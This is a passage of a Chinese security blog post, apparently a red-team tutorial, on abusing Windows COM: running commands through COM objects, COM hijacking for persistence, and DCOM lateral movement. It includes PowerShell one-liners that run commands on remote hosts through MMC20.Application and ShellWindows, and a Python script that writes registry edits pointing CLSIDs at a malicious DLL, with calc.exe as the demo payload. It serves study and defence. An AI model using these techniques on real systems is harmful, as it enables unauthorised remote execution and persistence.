+$handle.Document.ActiveView.ExecuteShellCommand(&#34;cmd&#34;,$null,&#34;/c calc&#34;,&#34;7&#34;)</code></pre><p>另一种调用COM执行命令</p>
+<pre tabindex="0"><code>$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID(&#34;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#34;)) 
+$item = $hb.Item() 
+$item.Document.Application.ShellExecute(&#34;cmd.exe&#34;,&#34;/c calc.exe&#34;,&#34;c:\windows\system32&#34;,$null,0)</code></pre><p>等等……还有很多</p>
+<pre tabindex="0"><code>$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID(&#34;72C24DD5-D70A-438B-8A42-98424B88AFB8&#34;))
+$shell.Run(&#34;calc.exe&#34;)</code></pre><h6 id="计划任务" class="heading-element"><span>0.0.0.2.2  计划任务</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>通过调用<code>ITaskFolder::registerTask</code> 来注册计划任务</p>
+<p>这里头像哥讲的很通俗，可以参考</p>
+<p><a href="http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html"target="_blank" rel="external nofollow noopener noreferrer">http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html</a></p>
+<p>根据微软官方稍作修改，实现dll武器化</p>
+<h6 id="进程注入" class="heading-element"><span>0.0.0.2.3  进程注入</span>
+  <a href="#%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>利用com实现进程注入，没有调用CreateProcess等常规api，而是调用<a href="https://docs.microsoft.com/en-us/windows/win32/winauto/getprocesshandlefromhwnd"target="_blank" rel="external nofollow noopener noreferrer">oleacc!GetProcessHandleFromHwnd()</a>，利用 <code>IRundown::DoCallback()</code>执行命令，并且该接口需要一个IPID和OXID值来执行代码。该接口也不是公开的方法，需要手动去逆，来实现武器化</p>
+<h5 id="com劫持" class="heading-element"><span>0.0.0.3  com劫持</span>
+  <a href="#com%e5%8a%ab%e6%8c%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>持久性com劫持https://www.4hou.com/posts/Mo51</p>
+<blockquote>
+<p>COM劫持（COM Hijacking）是一种安全漏洞利用技术，主要针对Windows操作系统中的COM（Component Object Model）对象注册机制。这种技术允许攻击者篡改或替换系统中已注册的COM组件，以执行恶意操作或获取系统权限。</p>
+</blockquote>
+<p>每个COM组件都有一个唯一的标识符（CLSID），并注册在系统的注册表中。应用程序可以通过CLSID来查找和调用COM组件的功能。</p>
+<p>COM劫持利用了以下几个关键点：</p>
+<ol>
+<li>注册表权限：COM组件的注册表项通常具有系统或管理员级别的权限。</li>
+<li>搜索路径：Windows在查找COM组件时会按照一定的顺序搜索注册表中的路径，攻击者可以通过修改这些路径来引导系统加载恶意的COM组件。</li>
+</ol>
+<h6 id="原理" class="heading-element"><span>0.0.0.3.1  原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>我们知道dll劫持的原理是利用加载dll的路径顺序，替换原dll为恶意dll，那么com劫持是不是也是类似的呢</p>
+<p>com组件的加载过程如下</p>
+<pre tabindex="0"><code>HKCU\Software\Classes\CLSID
+HKCR\CLSID
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\</code></pre><p>可以看到<code>HKCU</code>的优先级高于<code>HKCR</code>高于<code>HKLM</code></p>
+<p>那我们的目标就很明显了，劫持目标选择 <code>HKCU\Software\Classes\CLSID</code>，这样就会先加载我们的恶意dll。</p>
+<p>与dll劫持不同的是，dll劫持只能劫持dll，com劫持可以劫持 com文件、pe文件、api文件等</p>
+<p>步骤就是修改注册表的路径，指向我们的恶意路径，和白加黑一样</p>
+<h6 id="利用缺失的clsid" class="heading-element"><span>0.0.0.3.2  利用缺失的CLSID</span>
+  <a href="#%e5%88%a9%e7%94%a8%e7%bc%ba%e5%a4%b1%e7%9a%84clsid" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>每一个注册的clsid表项中都含有一个 <code>InprocServer32</code>的子项，该子项内有映射到该com二进制文件的键值对，操作系统通过该键值对将com二进制文件载入进程。</p>
+<p>==<code>InprocServer32</code>表示的是dll的实现路径，<code>LocalServer32</code>表示的是exe的实现路径==</p>
+</blockquote>
+<p>尝试一下对计算器进行com劫持，寻找 在<code>InprocServer32</code>下缺失的CLSID</p>
+<p>因为修改<code>InprocServer32</code>下的dll需要一定权限，所以该方法需要管理员权限</p>
+<p>python实现自动化替换路径</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">csv</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Inject</span>(<span style="color:#58a1dd">object</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">__init__</span>(<span style="color:#58a1dd">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">path</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;Logfile.CSV&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">with</span> <span style="color:#58a1dd">open</span>(<span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">path</span>,<span style="color:#a6be9d">&#39;r&#39;</span>,<span style="color:#58a1dd">encoding</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;utf-8&#39;</span>) <span style="color:#ff636f">as</span> <span style="color:#58a1dd">r</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">g</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">csv</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">DictReader</span>(<span style="color:#58a1dd">r</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">for</span> <span style="color:#58a1dd">name</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">g</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">z</span><span style="color:#ff636f">=</span>[<span style="color:#58a1dd">x</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">name</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">z</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#39;HK&#39;</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">name</span>[<span style="color:#58a1dd">i</span>]):
+</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;reg add </span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d"> /ve /t REG_SZ /d C:</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">Users</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">Administrator</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">Desktop</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">test</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">Dll64.dll /f&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">format</span>(<span style="color:#58a1dd">name</span>[<span style="color:#58a1dd">i</span>]),<span style="color:#58a1dd">file</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;com_hijack.bat&#39;</span>,<span style="color:#a6be9d">&#39;a&#39;</span>,<span style="color:#58a1dd">encoding</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">obj</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">Inject</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">obj</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">add</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;[!] Administrator run com_hijack.bat&#39;</span>)</span></span></code></pre></div><p>生成bat后需要管理员权限打开，再次打开calc发现已经成功劫持</p>
+<p>该方法有个明显的缺点，就是需要管理员权限。</p>
+<p>所以这里出现了第二种方法</p>
+<h6 id="覆盖com键" class="heading-element"><span>0.0.0.3.3  覆盖COM键</span>
+  <a href="#%e8%a6%86%e7%9b%96com%e9%94%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>原理：在<code>HKCU</code>注册表中添加键值后，当com对象被调用，<code>HKLM</code>中的键值就会被覆盖(并且添加到<code>HKCR</code>)中</p>
+<p>先使用oleview.net来过滤程序启动权限为空的id</p>
+<h5 id="dcom" class="heading-element"><span>0.0.0.4  DCOM</span>
+  <a href="#dcom" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>COM就像是家中的家电，它们都通过标准插座获取电力。DCOM则是一个扩展，它允许你在不同的房间甚至不同的房子之间传递电力。</p>
+<p>可以把它认为是一种应用协议，但它更准确地说是一套技术和规范的集合。在网络协议上它基于RPC，同时也包括大量其他技术。</p>
+</blockquote>
+<p>利用DCOM横向渗透：https://www.freebuf.com/articles/network/261454.html</p>
+<p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套<strong>组件对象接口标准</strong>，由一组<strong>构造规范</strong>和<strong>组件对象库</strong>组成。COM是许多微软产品和技术，如Windows媒体播放器和Windows Server的基础。</p>
+<p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它==支持不同的两台机器上的组件间的通信==，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p>
+<p>DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。</p>
+<p>使用DCOM进行横向移动的优势之一在于，<strong>在远程主机上执行的进程将会是托管COM服务器端的软件</strong>。这无疑能够增强隐蔽性，由于有大量程序都会向DCOM公开方法，因此防御者可能难以全面监测所有程序的执行。</p>
+<h6 id="dcom横移" class="heading-element"><span>0.0.0.4.1  DCOM横移</span>
+  <a href="#dcom%e6%a8%aa%e7%a7%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>com是在计算机本地的实现，DCOM是COM的进一步扩展，DCOM通过远程过程调用(RPC)将com的功能在远程计算机上实现，可以将DCOM理解为通过RPC实现的COM。</p>
+<p>调用DCOM需要的条件。</p>
+<p>通常情况下，调用DCOM连接到远程计算机的时候，我们已经具有了本地管理员的权限</p>
+<p>在很多com对象都看到APPid和CLSID是一个值，这里暂且将他们理解为CLSID的不同表示，就像GUID和CLSID一样</p>
+<p>枚举支持DCOM的应用程序</p>
+<pre tabindex="0"><code>Get-CimInstance -class Win32_DCOMApplication | select appid,name</code></pre><p>使用DCOM执行命令</p>
+<pre tabindex="0"><code>$com =[activator]::CreateInstance([type]::GetTypeFromProgID(&#34;MMC20.Application&#34;,&#34;127.0.0.1&#34;))
+$com.Document.ActiveView | gm           //查看方法</code></pre><p>看到执行命令的方法</p>
+<p>调用执行</p>
+<pre tabindex="0"><code>$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&#34;/c calc.exe&#34;,&#34;Minimzed&#34;)</code></pre><p>远程调用,需要关闭防火墙</p>
+<pre tabindex="0"><code>$com =[activator]::CreateInstance([type]::GetTypeFromProgID(&#34;MMC20.Application&#34;,&#34;192.168.135.246&#34;)) 
+$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&#34;/c calc.exe&#34;,&#34;Minimized&#34;)</code></pre><p>另一种组件实现</p>
+<pre tabindex="0"><code>$com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&#34;192.168.135.246&#34;)
+$obj = [System.Activator]::CreateInstance($com)
+$item = $obj.item()
+$item.Document.Application.ShellExecute(&#34;cmd.exe&#34;, &#34;/c calc.exe&#34;,&#34;c:\windows\system32&#34;,$null, 0)</code></pre><p>除了这两种方法，支持DCOM调用的还有很多公开的方法，这里不再一一列举，需要注意的是，不同的组件对不同的操作系统兼容性不同，建议投入实战前先测试兼容性</p>
+<pre tabindex="0"><code>Methods                     APPID
+MMC20.Application           7e0423cd-1119-0928-900c-e6d4a52a0715
+ShellWindows                9BA05972-F6A8-11CF-A442-00A0C90A8F39
+ShellBrowserWindow          C08AFD90-F2A1-11D1-8455-00A0C91F3880
+
+
+Document.Application.ServiceStart()
+Document.Application.ServiceStop()
+Document.Application.IsServiceRunning()
+Document.Application.ShutDownWindows()
+Document.Application.GetSystemInformation()</code></pre><p>怎么来查找是否可以被我们利用呢？</p>
+<p>可以通过oleview.net 来查找对应的CLSID和启动权限，看到这里 <code>Launch Permission</code>为空，说明普通权限即可</p>
+<p>windows文档：https://learn.microsoft.com/zh-cn/windows/win32/com/com-fundamentals</p>
+<p>相当好的文章：https://tttang.com/archive/1824/</p>
+<p>描述怎么挖掘com：https://paper.seebug.org/1624/#com_3</p>
+<p>自动挖掘com组件：https://github.com/nickvourd/COM-Hunter</p>
+<p>COM在权限维持中的应用https://ruyueattention.github.io/2021/12/26/COM%E5%8A%AB%E6%8C%81/</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-16 09:35:01">Updated on 2024-08-16&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-tag" title="Tags - 权限维持">权限维持</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/68/" class="post-nav-item" rel="prev" title="权限维持-计划任务"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>权限维持-计划任务</a>
+      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8/" class="post-nav-item" rel="next" title="CC6">CC6<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
